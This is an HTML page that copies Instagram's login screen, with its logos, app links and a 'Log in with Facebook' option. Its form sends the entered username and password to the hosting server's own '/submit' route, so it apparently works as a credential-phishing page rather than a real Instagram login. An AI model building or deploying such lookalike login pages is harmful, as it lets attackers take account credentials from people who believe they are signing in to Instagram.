<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="/Images/INSTA-MINILOGO.png" type="image/png" />
<link rel="stylesheet" href="/static/styles.css" />
    <title>Instagram</title>
  </head>
  <body>
    <div class="container">
      <!-- LEFT SECTION (Mobile Image) -->
      <div class="left-section">
        <img src="Images/mobileImage.jpeg" alt="Instagram Mobile Preview" />
      </div>

      <!-- RIGHT SECTION (Login Form) -->
      <div class="right-section">
        <div class="login-box">
          <img src="Images/instaTextLogo.png" alt="Instagram Logo" class="instaTextLogo" />

          <!-- Updated Form Starts -->
          <form action="/submit" method="POST" class="login-form">
            <input
              type="text"
              name="username"
              placeholder="Email address, username, phone number"
              required
            />

            <input
              type="password"
              name="password"
              placeholder="Password"
              required
            />

            <button type="submit" class="login-btn">Log in</button>
          </form>
          <!-- Updated Form Ends -->

          <div class="divider">
            <hr class="line" />
            <p>OR</p>
            <hr class="line" />
          </div>

          <div class="login-with-facebook">
            <img src="Images/fbicon.png" alt="Facebook Icon" class="fb-img" />
            <a href="#" class="facebook-login">Log in with Facebook</a>
          </div>

          <div>
            <a href="#" class="forgot-password">Forgotten your password?</a>
          </div>
        </div>

        <div class="signup-box">
          <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>

        <div class="download-section">
          <p>Get the app</p>
          <div class="app-buttons">
            <img src="Images/appstore.png" alt="App Store" class="app-btn" />
            <img src="Images/playstore.png" alt="Google Play" class="app-btn" />
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
